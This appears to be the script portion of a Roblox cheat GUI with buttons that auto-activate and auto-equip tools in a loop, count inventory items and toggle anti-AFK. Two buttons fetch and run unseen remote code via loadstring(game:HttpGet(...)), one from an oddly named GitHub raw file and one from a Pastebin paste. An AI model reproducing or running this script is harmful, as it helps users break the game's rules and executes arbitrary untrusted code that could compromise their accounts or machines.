-- Scripts:

local function TSAFGUB_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	--By DriedUpCat

	frame = script.Parent.Frame --Name of your frame
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(TSAFGUB_fake_script)()

StopLifting.MouseButton1Click:connect(function()
	StopLifting.Visible = false
	lift.Visible = true
	_G.Auto4 = false
end)

lift.MouseButton1Click:connect(function()
	lift.Visible = false
	StopLifting.Visible = true
	_G.Auto4 = true
	while _G.Auto4 do
		wait(WaitTimer.Text)
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.Name == Info.Text then v:Activate() end


		end
	end
end)

Unequip.MouseButton1Click:connect(function()
	Unequip.Visible = false
	equip.Visible = true
	_G.Equip = false
end)

equip.MouseButton1Click:connect(function()
	equip.Visible = false
	Unequip.Visible = true
	_G.Equip = true
	while _G.Equip do
		wait()
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			if v.Name == Info.Text then v:Activate()
				v.Parent = game.Players.LocalPlayer.Character
			end
		end
	end
end)

Gui.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/j6kl2/S_/main/gfgfdgjdgldmbgkfdfg", true))()
end)

close.MouseButton1Click:connect(function()
	close.Visible = true
	Frame.Visible = false
	close.Visible = false
end)

AntiAfk.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/SN4agUmB", true))()
end)

local function XVYMLY_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)
	frame = script.Parent.Parent
end

coroutine.wrap(XVYMLY_fake_script)()

repeat
	wait(.1)
	local num = 0
	for i,v in pairs(game:GetService("CoreGui").RobloxGui.Backpack.Inventory.ScrollingFrame.UIGridFrame:GetChildren()) do
		if v:IsA("TextButton") then
			num += 1
		end
	end

	ToolCounter.Text = num .." DW/DB"
until num == 9999999999999
